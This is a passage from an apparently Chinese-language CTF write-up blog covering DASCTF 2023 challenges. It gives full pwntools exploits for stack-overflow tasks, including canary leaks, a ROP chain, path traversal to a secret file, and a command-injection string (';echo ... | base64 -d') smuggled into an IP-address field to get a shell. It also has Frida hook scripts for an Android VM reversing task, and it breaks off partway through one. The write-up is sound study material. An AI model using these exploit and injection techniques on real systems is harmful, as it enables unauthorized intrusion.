<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">p, point</span>):</span></span><br><span class="line">    gdb.attach(p, point)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">elf_name = <span class="string">&quot;./GuestBook&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(elf_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25983</span>)</span><br><span class="line">elf = ELF(elf_name)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process([elf_name], env = &#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">rc = p.recv</span><br><span class="line">rcl = p.recvline</span><br><span class="line">rcu = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sda = p.sendafter</span><br><span class="line">sdl = p.sendline</span><br><span class="line">sdla = p.sendlineafter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    magic = elf.symbols[<span class="string">&#x27;magic&#x27;</span>]</span><br><span class="line">    system = <span class="number">0x4012C3</span> </span><br><span class="line">    ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">    sdla(<span class="string">&quot;name: &quot;</span>, <span class="string">b&#x27;Z&#x27;</span> * <span class="number">24</span>)</span><br><span class="line">    rc(<span class="number">30</span>)</span><br><span class="line">    canary = u64(rc(<span class="number">8</span>)) - <span class="number">0xA</span> </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sdla(<span class="string">&quot;leave(MAX 4): &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug(p, &quot;b *0x401463&quot;)</span></span><br><span class="line">    payload = <span class="string">b&#x27;Z&#x27;</span> * (<span class="number">128</span> + <span class="number">24</span>) + p64(canary + <span class="number">0x1</span>) + <span class="string">b&#x27;Z&#x27;</span> * <span class="number">8</span> + p64(system)</span><br><span class="line">    sdl(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;Z&#x27;</span> * (<span class="number">96</span> + <span class="number">24</span>) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    sdl(payload)</span><br><span class="line">    <span class="comment">#input()</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>





<h2 id="ESAYBOX"><a href="#ESAYBOX" class="headerlink" title="ESAYBOX"></a>ESAYBOX</h2><h3 id="0x00-Daily-Shell-Check-3"><a href="#0x00-Daily-Shell-Check-3" class="headerlink" title="0x00 Daily Shell Check"></a>0x00 Daily Shell Check</h3><p>开了NX和CANARY</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pz@pz-virtual-machine:PWN/CB ‹master*›$ checksec pwn      </span><br><span class="line">[*] &#x27;/home/pz/Desktop/PWN/CB/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>



<h3 id="0x01-Find-Hole-1"><a href="#0x01-Find-Hole-1" class="headerlink" title="0x01 Find Hole"></a>0x01 Find Hole</h3><p>这题有system函数，也有sh，无疑找到一处栈溢出直接就可以get shell，同时要想办法泄露canary</p>
<p>canary好泄露的一处提示点，存在了这里</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231026165304172.png" alt="image-20231026165304172"></p>
<p>那么溢出点一共有两处，第一处在 main 函数，但是canary结尾的00得写入两次，而主函数第一次要是输入的不是指定的命令就退出了，所以就是第二处溢出点，可以实现读入溢出</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231026165540109.png" alt="image-20231026165540109"></p>
<p>于是思路就是先泄露canary，再把payload写入某个文件，让这边读入进去实现栈溢出</p>
<h4 id="Leak-Canary"><a href="#Leak-Canary" class="headerlink" title="Leak Canary"></a>Leak Canary</h4><p>执行到cat命令，再把canary直接打印出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">sdla(<span class="string">&quot;name:&quot;</span>, <span class="string">&quot;P.Z&quot;</span>)</span><br><span class="line">sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">sdla(<span class="string">&quot;view: &quot;</span>, <span class="string">&quot;../secret/canary.txt&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(rc(<span class="number">0x10</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>



<h4 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h4><p>这里用到linux小知识</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stack overflow</span></span><br><span class="line">sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;PING&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;Z&#x27;</span> * <span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(sh) + p64(ret) + p64(system)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">pd = <span class="string">b&#x27;;echo &#x27;</span> + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line">pd += payload</span><br><span class="line">pd += <span class="string">b&#x27;&quot; | base64 -d&#x27;</span></span><br><span class="line"><span class="comment">#print(pd)</span></span><br><span class="line">sdla(<span class="string">&quot;address:&quot;</span>, pd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">sdla(<span class="string">&quot;view: &quot;</span>, <span class="string">&quot;result.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先在ping命令会读入我们的输入，然年后ping，还有检查命令什么的，所以先base64了我们的payload</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">pingCommand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> command[<span class="number">520</span>]; <span class="comment">// [rsp+100h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+308h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter an IP address: &quot;</span>);</span><br><span class="line">  Read(s, <span class="number">255LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(command, <span class="string">&quot;ping -c 4 %s &gt; /tmp/result.txt&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_ip(s) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32mPing result has been saved in /tmp/result.txt\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再用分号结束原本语句，base64解码到文件中，实际系统执行了这样的语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 ;echo &quot;WlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaAISAoA2jqGUAAAAAAAAAAOMcQAAAAAAAkCBAAAAAAAAaEEAAAAAAADASQAAAAAAA&quot; | base64 -d &gt; /tmp/result.txt</span><br></pre></td></tr></table></figure>





<h3 id="0x02-Get-Flag-3"><a href="#0x02-Get-Flag-3" class="headerlink" title="0x02 Get Flag"></a>0x02 Get Flag</h3><p>最后再回到CAT命令，让系统读入该payload，直接get shell</p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">p, point</span>):</span></span><br><span class="line">    gdb.attach(p, point)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#elf_name = &quot;./elf_name&quot;</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(elf_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25012</span>)</span><br><span class="line"><span class="comment">#elf = ELF(elf_name)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process([elf_name], env = &#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">rc = p.recv</span><br><span class="line">rcl = p.recvline</span><br><span class="line">rcu = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sda = p.sendafter</span><br><span class="line">sdl = p.sendline</span><br><span class="line">sdla = p.sendlineafter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x401ce3</span></span><br><span class="line">    system = <span class="number">0x401230</span></span><br><span class="line">    sh = <span class="number">0x402090</span></span><br><span class="line">    ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    sdla(<span class="string">&quot;name:&quot;</span>, <span class="string">&quot;P.Z&quot;</span>)</span><br><span class="line">    sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">    sdla(<span class="string">&quot;view: &quot;</span>, <span class="string">&quot;../secret/canary.txt&quot;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(rc(<span class="number">0x10</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stack overflow</span></span><br><span class="line">    sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;PING&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;Z&#x27;</span> * <span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(sh) + p64(ret) + p64(system)</span><br><span class="line">    payload = base64.b64encode(payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    pd = <span class="string">b&#x27;;echo &#x27;</span> + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line">    pd += payload</span><br><span class="line">    pd += <span class="string">b&#x27;&quot; | base64 -d&#x27;</span></span><br><span class="line">    <span class="comment">#print(pd)</span></span><br><span class="line">    sdla(<span class="string">&quot;address:&quot;</span>, pd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    sdla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">    sdla(<span class="string">&quot;view: &quot;</span>, <span class="string">&quot;result.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="vm-flutter"><a href="#vm-flutter" class="headerlink" title="vm_flutter"></a>vm_flutter</h2><h3 id="0x00-Daily-Shell-Check-4"><a href="#0x00-Daily-Shell-Check-4" class="headerlink" title="0x00 Daily Shell Check"></a>0x00 Daily Shell Check</h3><p>无壳apk逆向</p>
<h3 id="0x01-VM"><a href="#0x01-VM" class="headerlink" title="0x01 VM"></a>0x01 VM</h3><p>flutter只是纸老虎，实际加密都在java层，然而我看到flutter题目都没打开，乐，看到wp作者说只有opcode在dart层，但其实无关紧要，只要hook出VM所有操作，就能理解加密了，而且只是稍加分析会发现这是个基于栈的虚拟机，都是调用这两个函数</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027222932068.png" alt="image-20231027222932068"></p>
<p>在这也能发现所有的字节码都给了字符串提示，只需要找到相应被混淆的函数名改成这里的操作即可</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223033084.png" alt="image-20231027223033084"></p>
<p>于是hook所有VM的step</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bActivity.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Lshift&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.b.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Rshift&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.c.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.d.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;and&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.e.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;load &quot;</span> + a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.f.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;mul&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.g.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;or&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.h.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;pop&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.i.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;push &quot;</span>, + a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.j.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;store &quot;</span> + a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.k.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;store&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bActivity.l.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;xor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即可打印出所有操作，可以发现加密也十分简单，所有加密都是先加然后异或</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223233681.png" alt="image-20231027223233681"></p>
<p>这题就这样结束了…真的算不上难题，应该算中等偏简单了，然而我后续我想打印check函数，这个bVar里的f741b</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223354005.png" alt="image-20231027223354005"></p>
<p>遇到了几个坑</p>
<ul>
<li>首先是这个字段原本是叫 b，但是包名被混淆成 b 所以这里改名成 f741b (全程 flied 741 b)</li>
</ul>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223441917.png" alt="image-20231027223441917"></p>
<ul>
<li>然后hook到S是直接使用实例的对象也就是直接可以打印 b 字段</li>
</ul>
<p>但是一直打印出，纳闷了，怎么变函数了？？</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223634696.png" alt="image-20231027223634696"></p>
<ul>
<li>噢原来还有个函数叫 b，我测</li>
</ul>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223655668.png" alt="image-20231027223655668"></p>
<ul>
<li>于是在这里获取对象的 b 前加 _ 即可获取因为重名的字段</li>
</ul>
<p><img src="/DASCTF2023-X-CBCTF/image-20231027223736450.png" alt="image-20231027223736450"></p>
<p>（简单的一个下划线折腾几小时.jpg）</p>
<p>完整脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> mainActivity = Java.use(<span class="string">&quot;com.dasctf.vm_flutter.vm_flutter.MainActivity&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> bActivity = Java.use(<span class="string">&quot;k.b&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        mainActivity.S.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">bVar</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] Call Check!&quot;</span>);</span><br><span class="line">            <span class="comment">// var fields = bActivity.class.getDeclaredFields();</span></span><br><span class="line">            <span class="comment">// var methods = bActivity.class.getDeclaredMethods();</span></span><br><span class="line">            <span class="comment">// for ( var i = 0; i &lt; fields.length; i++ )&#123;</span></span><br><span class="line">            <span class="comment">//     console.log(fields[i].getName());</span></span><br><span class="line">            <span class="comment">// &#125;;</span></span><br><span class="line">            <span class="comment">// for ( var i = 0; i &lt; methods.length; i++ )&#123;</span></span><br><span class="line">            <span class="comment">//     console.log(methods[i].getName());</span></span><br><span class="line">            <span class="comment">// &#125;;</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;para: &quot;</span> + bVar._b.value);</span><br><span class="line">            <span class="comment">// for (var i = 0; i &lt; 33; i++) &#123;</span></span><br><span class="line">            <span class="comment">//     var fieldValue = bVar.$b[i].value;</span></span><br><span class="line">            <span class="comment">//     console.log(&quot;f741b[&quot; + i + &quot;] = &quot; + fieldValue);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// var result = this.S(bVar);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;result: &quot; + result);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.S(bVar);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.a.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Lshift&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.b.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Rshift&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.c.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.d.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;and&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.e.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;load &quot;</span> + a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.f.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;mul&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.g.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;or&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.h.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;pop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bActivity.i.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) 